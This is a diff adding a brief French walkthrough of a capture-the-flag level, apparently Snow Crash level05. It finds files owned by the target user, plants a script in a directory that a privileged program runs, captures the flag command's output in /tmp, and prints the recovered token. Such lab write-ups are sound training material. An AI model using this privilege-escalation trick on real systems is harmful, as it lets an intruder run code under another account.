@@ -1,0 +1,19 @@
+Bon pas d'executable/indice donc on va essayer de le trouver comme avec le level 00
+
+find / -user flag05 2>/dev/null
+
+On trouve 
+
+/usr/sbin/openarenaserver
+/rofs/usr/sbin/openarenaserver
+
+D'après le code ca a l'air de run tous ce qu'il y a dans /opt/openarenaserver/* ; puis ca le delete
+
+J'ai pas les droits X dessus mais bon on va le faire avec bash /usr/sbin/openarenaserver
+
+Donc je met un scripts dedans avec : echo `getflag` > /tmp/42.txt
+
+je le run et ensuite
+
+cat /tmp/42.txt
+Check flag.Here is your token : viuaaale9huek52boumoomioc
